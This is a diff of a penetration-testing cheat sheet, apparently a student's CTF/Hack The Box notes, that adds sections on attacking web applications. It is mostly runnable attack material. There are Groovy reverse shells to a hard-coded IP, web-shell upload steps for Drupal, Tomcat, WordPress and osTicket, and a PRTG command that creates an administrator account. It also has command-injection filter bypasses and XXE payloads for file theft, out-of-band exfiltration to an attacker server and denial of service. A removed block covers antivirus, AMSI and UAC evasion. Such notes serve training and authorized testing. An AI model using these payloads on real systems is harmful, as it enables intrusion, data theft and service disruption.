@@ -2450,20 +2450,6 @@ Fuzzing: `dirfuzz [URL]`
 -  `403`  forbidden to access the resource from the origin IP
 -  `301`  being redirected (not a failure case)
 
-**IIS file/dir discovery**
-
-- General discovery: 
-
-  `/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt`
-
-- Shortname scanner (`msfconsole`)
-
-  It returns file/dir name with the wildcards `*` and `*~1`, that have to be fuzzed
-
-- Extensions:
-
-  `/usr/share/wordlists/extension-wordlist/asp.net.txt`
-
 **Important files:**
 
 - `.swp` *swap files:* 
@@ -2551,10 +2537,6 @@ There are different types of POST parameters formats, depending on the *content 
 
 ### Common Application
 
-#### Python editor
-
-https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes
-
 #### Amazon Buckets
 
 The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..
@@ -2576,6 +2558,380 @@ If php files are shown, it means that the bucket is handling the php page. Thus 
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 ```
+
+#### CGI, CGI-BIN
+
+The dir can be hidden, remember to FUZZ!!
+
+Directory containing scripts: `/cgi`, `/cgi-bin`, `/CGI-bin`
+
+- Extension Fuzzing → `pl`, `cgi`, `sh`, `bat`, `cmd`
+- Apache Tomcat: `[URL]/[CGI_DIR]/[SCRIPT]&[URL_enc-CMD]` (CVE-2019-0232)
+  - dir
+  - set (env variables)
+  - whoami
+- [Shellshock Exploits](https://github.com/mubix/shellshocker-pocs)
+
+#### ColdFusion
+
+##### Enumeration
+
+- Port 80 for HTTP and port 443 for HTTPS by default
+- File extensions: `.cfm` `.cfc`
+- Installation files: `admin.cfm` and `CFIDE/administrator/index.cfm`
+
+##### Exploit
+
+- Adobe ColdFusion <= 9.0.1 **Directory traversal** CVE-2010-2861
+  - `lib/password.properties` stores encypted passwords (could also not be in `lib`)
+- Adobe ColdFusion versions <=8.0.1 **RCE** CVE-2009-2265
+
+#### Drupal
+
+##### Enumeration
+
+```bash
+curl -s [URL] | grep -i drupal
+curl -s [URL]/CHANGELOG.txt | grep -m2 ""
+droopescan scan drupal -u [URL]
+```
+
+##### Exploitation
+
+- **Version < 8**: Enable PHP Filter module
+
+  1. Login    → `/admin/modules` → Enable `PHP Filter`
+  2. Content → Add Content    → Create `Basic Page`    → PHP Shell in Body → Text Format = `PHP Code`
+  3. Save     → Append Shell Parameters to Page URL → `/node/[ID]?p=[CMD]`
+
+- **Version > 8**: Install the PHP filter module
+
+  1. Download 
+
+     ```bash
+     wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+     ```
+
+  2. Go to Administration &rarr; Reports &rarr; Available updates (or in the Extend menu)
+
+  3. Install &rarr; Previous exploit
+
+- **Upload a new Module** (administrative access)
+
+  1. Select a module and download it, e.g. CAPTCHA
+
+     ```bash
+     wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz; tar xvf captcha-8.x-1.2.tar.gz
+     ```
+
+  2. Create PHP Shell File
+
+  3. Create a `.htaccess` File
+
+     ```html
+     <IfModule mod_rewrite.c>
+     RewriteEngine On
+     RewriteBase /
+     </IfModule>
+     ```
+
+  4. Create  an archive
+
+     ```bash
+     mv shell.php .htaccess captcha
+     tar cvf captcha.tar.gz captcha/
+     ```
+
+  5. Upload:
+
+     - click on Manage &rarr; Extend &rarr; Install new module`
+
+     - Request: `/modules/captcha/shell.php?p=[CMD]`
+
+- **Drupalgeddon**
+
+  - [Drupalgeddon](https://www.drupal.org/SA-CORE-2014-005) 7.0 - 7.31 pre-authenticated SQL injection
+  - [Drupalgeddon2](https://www.drupal.org/sa-core-2018-002)<7.58, 8.5.1 RCE
+  - [Drupalgeddon3](https://cvedetails.com/cve/CVE-2018-7602/) 7.x, 8.x RCE
+
+#### Gitlab
+
+##### Enumeration
+
+- Version: `/help` when logged in
+- Public projects: `/explore`
+- Users: `/users/sign_up`
+
+#### IIS
+
+##### Enumeration
+
+- General discovery: 
+
+  `/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt`
+
+- Shortname scanner (`msfconsole or` https://github.com/irsdl/IIS-ShortName-Scanner)
+
+  It returns file/dir name with the wildcards `*` and `*~1`, that have to be fuzzed
+
+- Extensions:
+
+  `/usr/share/wordlists/extension-wordlist/asp.net.txt`
+
+#### Jenkins
+
+##### Enumeration
+
+- Configuration → `[URL]/configureSecurity`
+- Login Page    → `[URL]/login` → Jenkins Banner / Spraying
+
+##### RCE
+
+1. Access the script console `[URL]/script`, to run Apache Groovy scripts
+
+2. Groovy Linux
+
+   - Groovy code to get rev shell
+
+     ```groovy
+     r = Runtime.getRuntime()
+     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+     p.waitFor()
+     ```
+
+   - [Metasploit](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/)
+
+3. Groovy Windows
+
+   - Groovy code 
+
+     - ```groovy
+       String host="localhost";
+       int port=8044;
+       String cmd="cmd.exe";
+       Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+       ```
+
+   - [Java Shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy)
+
+   - Replace `host`, `port` strings
+
+#### Joomla
+
+##### Enumeration
+
+- Version fingerprinting
+
+  - `media/system/js/`
+  - `administrator/manifests/files/joomla.xml`
+  - `plugins/system/cache/cache.xml`
+
+- Enumeration
+
+  - `droopescan scan joomla --url [URL]`
+  - `python2.7 ~/TOOLS/JoomlaScan/joomlascan.py -u [URL]`
+
+- Brute-Forcing [joomla-brute](https://github.com/ajnik/joomla-bruteforce)
+
+  - ```bash
+    sudo python3 joomla-brute.py -u [URL] -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+    ```
+
+#### LDAP
+
+##### Enumeration
+
+```bash
+ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+```
+
+- Connect to the server `ldap.example.com` on port `389`.
+- Bind (authenticate) as `cn=admin,dc=example,dc=com` with password `secret123`.
+- Search under the base DN `ou=people,dc=example,dc=com`.
+- Use the filter `(mail=john.doe@example.com)` to find entries that have this email address.
+
+##### Exploit
+
+- **LDAP Injection**
+
+  Attack web applications using LDAP for authentication or storing user information.
+
+  | Input    | Description                                                  |
+  | -------- | ------------------------------------------------------------ |
+  | `*`      | An asterisk `*` can `match any number of characters`.        |
+  | `( )`    | Parentheses `( )` can `group expressions`.                   |
+  | `|`      | A vertical bar `|` can perform `logical OR`.                 |
+  | `&`      | An ampersand `&` can perform `logical AND`.                  |
+  | `(cn=*)` | Input values that try to bypass authentication or authorisation checks by injecting conditions that `always evaluate to true` can be used. For example, `(cn=*)` or `(objectClass=*)` can be used as input values for a username or password fields. |
+
+  - Use `*` to authenticate
+
+#### osTicket
+
+##### Exploit
+
+- RCE (after logging in /administrator)
+  1. If `An error has occurred. Call to a member function  format() on null` go to  `/administrator/index.php?option=com_plugins` and disable the "Quick Icon - PHP Version Check" plugin. 
+  2. click on `Templates` on the bottom left under `Configuration` 
+  3. click on a template &rarr; choose `protostar` under the `Template` column
+  4. click on a page to pull up the page source
+  5. Add a php web shell `system($_GET['c']);`
+
+#### Enumeration
+
+- cookie named `OSTSESSID`
+- The footer may contain the words `Support Ticket System`.
+
+#### PRTG Monitor
+
+##### Admin Shell
+
+- Click on Setup &rarr; Account Settings &rarr; Notifications &rarr; Add new notification
+
+- Set Name → Tick `EXECUTE PROGRAM` 
+
+- Under `Program File` select `Demo exe notification  - outfile.ps1`
+
+- Enter a command in the Parameter CMD field, `test.txt;[CMD]`e.g. add a new local admin:
+
+  ```powershell
+  test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+  ```
+
+- Save → Click `Test` to Run Notification
+
+#### Python editor
+
+https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes
+
+#### Ruby on Rails
+
+Vulnerable to mass assignment exploit: 
+
+ Endpoints with PATCH/PUT Capabilities → [Assignment Parameters](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/README.md#exploiting-a-mass-assignment)
+
+#### Splunk
+
+##### Shell Upload
+
+1. Endpoint: `[URL]/manager/search/apps/local`   → Install app from File
+
+2. Download [Create Shell Package](https://github.com/0xjpuff/reverse_shell_splunk)
+
+3. Edit `/bin/rev.py` for Linux or `/bin/run.ps1` for Windows
+
+4. Tar up
+
+   ```bash
+   tar -cvzf updater.tar.gz reverse_shell_splunk/
+   ```
+
+5. Start a listener
+
+6. `Install app from file` and upload
+
+#### Tomcat
+
+##### Enumeration
+
+```bash
+curl -s [URL]/docs | grep -i tomcat
+```
+
+Files to check:
+
+- `/WEB-INF/web.xml`
+- `/conf/tomcat-users.xml`
+- `/cgi` folder
+
+Fingerprinting:
+
+Invalid Path → `[URL]/Invalid` → Error String Version Disclosure → Exploit Research
+
+##### Manager Access
+
+- **Login Bruteforcing** (common default credentials)
+
+  - Metasploit:
+
+    `use auxiliary/scanner/http/tomcat_mgr_login` / `mgr_brute.py` 
+
+  - [mgr_brute.py](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
+
+- **Shell Upload**
+
+  - Metasploit automated:
+
+     [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) 
+
+  - WAR shell:
+
+    - Download from `jsp`
+
+      ```bash
+      wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp; zip -r backup.war cmd.jsp
+      ```
+
+    - Very Light `jsp` shell and stealty
+
+      ```bash
+      wget https://raw.githubusercontent.com/SecurityRiskAdvisors/cmd.jsp/refs/heads/master/cmd.jsp; zip -r backup.war cmd.jsp
+      ```
+
+      Change Uploaded Casing → `FileOutputStream(f);stream.write(m);o="uPlOaDeD:`
+
+    - Metasploit:
+
+      ```bash
+      msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > backup.war
+      ```
+
+  - Browse & Upload → Deploy → Request `[URL]/backup/cmd.jsp?p=[CMD]`
+
+- **GhostCat** Unauthenticated LFI
+
+  - [tomcat-ajp.lfi.py](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
+
+  - ```bash
+    python2 tomcat-ajp.lfi.py [URL] -p [PORT] -f conf/tomcat-users.xml
+    ```
+
+  - Versions < `9.0.31`, `8.5.51`, `7.0.100`
+
+#### Wordpress
+
+##### Standard folders
+
+- wp-admin
+- wp-login.php
+  - Confirm valid users
+- wp-content
+  - plugins
+    - To get version: go to the `readme.txt`
+    - Exploit research:
+      - `mail-masta`: [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and [Local File Inclusion](https://www.exploit-db.com/exploits/50226)
+  - themes
+
+##### WPscan
+
+- **enumeration**
+
+  ```bash
+  sudo wpscan --url [URL] --enumerate --api-token dEOFB<SNIP>
+  ```
+
+- **login brute-forcing**
+
+  ```bash
+  sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url [URL]
+  ```
+
+- **Code-Execution** (administrative access) [Also on Metaspoit]
+
+  1. `Appearance` on the side panel &rarr; Theme Editor. 
+  2. Select a theme (better non active)
+  3. Edit the php code of an uncommon page (e.g. 404.php) by adding a web shell `system($_GET[0]);`
+  4. Click on `Update File` at the bottom to save. 
 
 ## Exploitation
 
@@ -2708,6 +3064,8 @@ Bypass Client-Side Validation → Intercept Upload Request → Webshell in Multi
       - `action="/[BACKEND_FILE]"` 
 
         Guess or fuzz the file that processes the upload
+      
+    - Use `Console` to debug and see error messages
 
   - Disable front-end validation
     - `CTRL+SHIFT+C` to toggle the Page Inspector
@@ -3014,6 +3372,121 @@ Tools:
 
     If the `ssh`, `mail` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into  them and set the username to PHP code, and upon including their logs,  the PHP code would execute.
 
+#### OS Injection (command injection)
+
+If in the backend, when you send a request though a parameter, this gets processed through a linux command, it could be vulnerable to executing multiple commands, like `&&` or `;`.
+
+[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)
+
+##### Tools
+
+- **Linux**
+
+  ```bash
+  bashfuscator -c '[COMMAND]' -s 1 -t 1 --no-mangling --layers 1
+  ```
+
+- **Windows**
+
+  [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
+
+  ```powershell
+  Import-Module .\Invoke-DOSfuscation.psd1
+  Invoke-DOSfuscation
+  SET COMMAND [COMMAND]
+  encoding
+  1
+  ```
+
+  
+
+| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
+| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
+| Semicolon              | `;`                     | `%3b`                     | Both                                       |
+| New Line               | `\n`                    | `%0a`                     | Both                                       |
+| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
+| Pipe                   | `|`                     | `%7c`                     | Both (only second output is shown)         |
+| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
+| OR                     | `||`                    | `%7c%7c`                  | Second (only if first fails)               |
+| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |
+
+##### Filters
+
+- **Characters**
+
+  - Space:
+    - Tab: `%09`
+    - IFS Linux Variable has default value space+ tab: `${IFS}`
+    - `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, e.g. `{ls,-la}`
+  - Linux slash `/`
+    - Env variables: `${PATH:0:1}` same with `$HOME` or `$PWD`
+  - Windows slash `\`
+    - cmd: `%HOMEPATH:~6,-[USERNAME-LENGHT]%`
+    - Powershell: `$env:HOMEPATH[0]`
+  - Semi-colon `;`
+    - Linux only: `${LS_COLORS:10:1}`
+
+  - Character Shifting:
+
+    1. ```bash
+       man ascii	# Shows ascii table
+       ```
+
+    2. Spot the character you need and select the previous one
+
+    3. `$(tr '!-}' '"-~'<<<[PREV_CHAR])`
+
+- **Linux Commands**
+
+  - single `'` or double `"` quotes, e.g. `w'h'o'am'i` (even number)
+
+  - `\`
+
+  - `$@`
+
+  - Alternating cases (e.g. `WhOaMi`) or all capital (e.g. `WHOAMI`)
+
+    ```bash
+    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+    ```
+
+  - Reverse letters (imaohw` instead of `whoami)
+
+    ```bash
+    $(rev<<<'imaohw')
+    ```
+
+  - Encoding `base64`, `xxd` (use `echo -n`)
+
+    ```bash
+    bash<<<$(base64 -d<<<[BASE64_COMMAND])
+    ```
+
+- **Windows Commands** 
+
+  - single `'` or double `"` quotes, e.g. `w'h'o'am'i` (even number)
+
+  - `^`
+
+  - Alternating cases (e.g. `WhOaMi`) or all capital (e.g. `WHOAMI`)
+
+  - Reverse letters (imaohw` instead of `whoami)
+
+    ```powershell
+    iex "$('imaohw'[-1..-20] -join '')"
+    ```
+
+  - Encoding
+
+    ```bash
+    echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+    ```
+
+    ```powershell
+    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('[BASE64_COMMAND]')))"
+    ```
+
+
 #### SQL Injections
 
 ##### Injection types:
@@ -3187,7 +3660,7 @@ ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.t
 
 - **Login Bypass**
 
-  `random' or 1=1-- -` with `'` `"` `` ` ``
+  `admin' or 1=1-- -` with `'` `"` `` ` ``
 
 - **Union Injection**
 
@@ -3239,34 +3712,176 @@ ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.t
 
 #### XXE Injection
 
-*XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data. 
-
 *XML Entities* are a way of representing an item of data within an XML
-document, instead of using the data itself. E.g., `&lt;` and `&gt;` represent < and > .
+document (markup language), instead of using the data itself. E.g., `&lt;` and `&gt;` represent < and > .
 
-An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Note that a parser transforms raw data into a structured format.
+##### **Confirmation**
 
-Burpsuit responder: 
-
-```php
+```xml
 <!--?xml version="1.0" ?-->
-<!DOCTYPE foo [<!ENTITY example SYSTEM "FILE"> ]>
-<data>&example;</data>
+<!DOCTYPE foo [
+	<!ENTITY hello "Hello">
+]>
+<data>&hello;</data>
 ```
 
 - data: vulnerable parameter, the *reflected* one.
+- If the `DOCTYPE` was already declared, just add the `ENTITY`.
+- If vulnerable, it would print "Hello"
 
-#### OS Injection (command injection)
+##### Exploits
 
-If in the backend, when you send a request though a parameter, this gets processed through a linux command, it could be vulnerable to executing multiple commands, like `&&` or `;`.
+- **`php` application**
 
-Some examples:
+  - File read:
 
-- If the parameter is printing a file from the a local system, it has to save the file in www.data for it to be able to display it. 
+    ```xml
+    <!ENTITY hello SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+    ```
 
-  Thus, in the backend it will do something like `cat $1 > out.txt` and the command injection while be: `/etc/passwd; whoami; #`
+  - Command execution (if reflected, and the filter is installed)
 
-#### SSTI 
+    1. Execute basic commands
+
+       ```xml
+       <!ENTITY hello SYSTEM "php://expect://id">
+       ```
+
+    2. Gain a shell:
+
+       1. Write a web shell, and open a server
+
+       2. Upload the shell on the web server with `expect`
+
+          ```xml
+          <!ENTITY hello SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+          ```
+
+       3. Interact
+
+- **Reflected File read**
+
+  ```xml
+  <!DOCTYPE foo [<!ENTITY hello SYSTEM "FILE"> ]>
+  ```
+
+  - ssh keys 
+
+  - Windows hash stealing
+
+  - If the sintax breaks the xml:
+
+    ```bash
+    echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+    httpserv
+    ```
+
+    In the request use the `CDATA` tag, reference the `&joined;` entity
+
+    ```xml
+    <!ENTITY % begin "<![CDATA["> 
+    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
+    <!ENTITY % end "]]>">
+    <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
+    %xxe;
+    ```
+
+- **Error based File Read**
+
+  1. Try to cause an error
+
+     - delete any of the closing tags, 
+     - change one of them, so it does not close
+     - reference a non-existing entity
+
+  2. Host a DTD file with the payload
+
+     ```xml
+     <!ENTITY % file SYSTEM "file:///etc/hosts">
+     <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+     ```
+
+     Defines the `file` parameter entity and joins it with a non-existing entity
+
+  3. Request the DTD file referencing for `&nonExistingEntity;%file;`
+
+     ```xml
+     <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+     %remote;
+     %error;
+     ```
+
+- **Blind File Read**
+
+  - Out-of-band (OOB) Data Exfiltration
+
+    send a web request to our web server with the content of the file
+
+    1. Define file Entity, e.g. using php filter and define its content in another
+
+       ```xml
+       <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+       <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+       ```
+
+    2. Host a DTD file with content:
+
+       ```xml
+       <?xml version="1.0" encoding="UTF-8"?>
+       <!DOCTYPE email [ 
+         <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+         %remote;
+         %oob;
+       ]>
+       <root>&content;</root>
+       ```
+
+    3. Send Request
+
+  - [XXEinjector](https://github.com/enjoiz/XXEinjector)
+
+    - Add after header XXEINJECT in the request:
+
+      ```xml
+      <?xml version="1.0" encoding="UTF-8"?>
+      XXEINJECT
+      ```
+
+    - ```bash
+      ruby XXEinjector.rb --host=[tun0 IP] --httpport=8888 --file=xxe.req --path=/etc/passwd --oob=http --phpfilter
+      ```
+
+    - See the results
+
+      ```bash
+      cat Logs/[IP]/[PATH].log
+      ```
+
+- **SSRF**
+
+  enumerate open ports and access their pages, and restricted web pages
+
+- **Denial of Service (DOS)**
+
+  ```xml
+  <!ENTITY a0 "DOS" >
+    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">  
+  ```
+
+  This payload defines the `a0` entity as `DOS`, references it in `a1` multiple times, references `a1` in `a2`, and so on until the back-end server's memory runs out due to the self-reference loops. *No longer works with modern web servers.*
+
+
+
+#### SS Template Injection
 
 **Template Engines** are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client.
 
@@ -3293,6 +3908,47 @@ Confirmation
 - Errors / Reflection → Check Template Documentation + Exploits
 
 [Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+
+#### HTTP Verb Tampering
+
+Change the HTTP method into one that was not taken into account.
+
+**Like `GET`**:
+
+- `DELETE`
+- `HEAD`
+
+**Like `POST`**:
+
+Add `Content-Type: application/x-www-form-urlencoded` and move the `param=value` at hte bottom
+
+- `PUT`
+- `PATCH`
+
+##### identify
+
+- Show accepted methods
+
+  ```bash
+  curl -i -X OPTIONS [URL]
+  ```
+
+- Allows to:
+
+  - Bypass blocked pages/ request
+  - Bypass Injection filters
+
+
+#### IDOR
+
+`Insecure Direct Object References (IDOR)` occur when a reference to an object is exposed and can be controlled to  access to other similar objects. E.g. if `download.php?file_id=123` allows you to download other files by changing the `id`.
+
+- Fuzz
+- Understand the encoding (is it done by the front-end?)
+
+#### Web Mass Assignment
+
+
 
 ### Client-side
 
@@ -4264,6 +4920,13 @@ perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
 
 ### Shells
 
+#### Meterpreter Upgrade
+
+- `msfconsole -q`
+- `use exploit/windows/smb/smb_delivery` 
+- RCE Via Generated RunDLL Command
+- `sessions` &rarr; `sessions 1`
+
 #### Metasploit 
 
 - Staged (more stable):   
@@ -4318,66 +4981,6 @@ perl -e 'use LWP::Simple; getstore("[LINK]", "FILE");'
     - Useful when Process Crashes
     - `echo "run post/windows/manage/migrate" > ~/automigrate.rc`
     - In `multi/handler` MSF Panel → `set AutoRunScript multi_console_command -r ~/automigrate.rc`
-
-### Evasion
-
-#### Antivirus Evasion
-
-You have an antivirus when you cannot execute malwares [Hacktricks](https://book.hacktricks.wiki/en/windows-hardening/av-bypass.html)
-
-- Enumeration
-  - `wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`
-  - `Get-MpComputerStatus`
-- Folder Exclusion Bypass
-  - Check Folders -> `reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"`
-  - Place Malware in Allowed Folder
-- Disable AV (Code Execution as Admin)
-  - `powershell Set-MpPreference -DisableIOAVProtection $true`
-  - `powershell Set-MpPreference -DisableRealTimeMonitoring $true`
-- Malware Obfuscation tools:
-  - `msfvenom -p [WINDOWS_PAYLOAD] LHOST=[NIC] LPORT=4444 -f exe -x [WIN_BINARY] > out.exe` -> Choose "whoami" / "ping" / "plink"
-  - [Ebowla](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html)
-  - Prometheus Shell
-    - [Download](https://github.com/paranoidninja/0xdarkvortex-MalwareDevelopment/blob/master/prometheus.cpp) + Change IP & Port
-    - 32/64-Bit Cross-Compile → `[i686-w64-mingw32-g++ / g++] prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc`
-
-#### Powershell evasion
-
-- Execution Policy
-  - `powershell -noni -nop -ep bypass -w hidden -NoExit [COMMAND]`
-  - `Set-ExecutionPolicy Bypass -Scope Process` -> From a PS Session
-  - 32/64-Bit Execution
-    - Try Both Binaries
-    - `c:\windows\syswow64\windowspowershell\v1.0\powershell.exe`
-    - `c:\windows\sysnative\windowspowershell\v1.0\powershell.exe`
-- AMSI
-  - Paste the payload in a PS session to bypass AMSI
-  - [Payloads Here](https://amsi.fail)
-- Constrained Language
-  - Check if enabled -> `$ExecutionContext.SessionState.LanguageMode`
-  - [Bypasses](https://sp00ks-git.github.io/posts/CLM-Bypass/)
-- AppLocker: excludes some folders that you can execute powershell from
-  - `Get-AppLockerPolicy -Effective | select -exp RuleCollections` 
-  - [Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList) / Run Scripts from Allowed Folders
-
-#### UAC
-
-When you are member of Administrators, but you have restricted privileges and file access of a true SYSTEM user
-
-- Enumeration
-  - Member of "Administrators" + Restricted Privileges / File Access
-  - `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` -> Check if greater than "0"
-  - `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin` -> Check if greater than "0"
-- Bypasess
-  - `[environment]::OSVersion.Version` → [UACME](https://github.com/hfiref0x/UACME) + [Checklist](https://academy.hackthebox.com/module/67/section/626) + Google Search
-  - Send Reverse Shell                            → Through a SYSTEM RCE / Similar Exploit
-  - GUI Access                        → CMD “Run as Administrator” → Input Credentials
-  - EventViewer Method
-    - [Load Module](https://github.com/CsEnox/EventViewer-UACBypass) → `Import-Module Invoke-EventViewer`
-    - Exploit            → `Invoke-EventViewer [PATH\TO\MALWARE.exe]`
-  - PSExec (Local / Remote)
-    - `PsExec.exe -h -s -i cmd` -> No Credentials
-    - `psexec.py [AUTH_STRING]` -> Requires Credentials
 
 ## Metasploit
 
@@ -4891,11 +5494,10 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 ### Users & Privileges
 
-- `cat /etc/passwd | grep sh`
-
+- `cat /etc/passwd | grep sh$`
+- `printenv`
 - Last logins: `lastlog`
 - Active Users: `w`
-- Distro: `cat /etc/lsb-release`
 
 #### Groups
 
@@ -4928,12 +5530,6 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 #### PRIVILEGES
 
 [GTFOBins](https://gtfobins.github.io/)
-
-- Compare binaries with GTFO bins:
-
-  ```bash
-  for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
-  ```
 
 - `strace [BIN] -c1 [IP]`: track and analyze system calls and signal processing
 
@@ -4989,7 +5585,7 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user, e.g. /bin/bash
 ##### SUID binaries &rarr; Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin:
 
 ```bash
-find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+find / -user root -perm -4000 -ls 2>/dev/null
 ```
 
 **Exploits:**
@@ -5010,7 +5606,7 @@ find / -uid 0 -perm -6000 -type f 2>/dev/null
 ##### Capabilities
 
 ```bash
-find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+getcap -r / 2>/dev/null
 ```
 
 - Some capabilities give you direct access to root [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=capabi#references):
@@ -5145,11 +5741,11 @@ Directories & Files Worth Checking:
   - User Owned / Readable Files
   
     ```bash
-    find / -type f -user [group] 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
+    find / -type f -user [group] 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log|/var/backups"
     ```
   
     ```bash
-    find / -type f -readable 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
+    find / -type f -readable 2>/dev/null | grep -v -E "/proc|/sys|/run|/var/lib|/usr/src|/usr/share|/usr/lib|/var/cache|/boot|/etc|/bin|/sbin|/include|/log|/var/backups"
     ```
   
   - User Data Directories
@@ -5190,7 +5786,7 @@ Directories & Files Worth Checking:
 - Search credentials in folder and subfolders:
 
   ```bash
-  grep -rniH "[STRING]" [PATH] [-e REGEX]
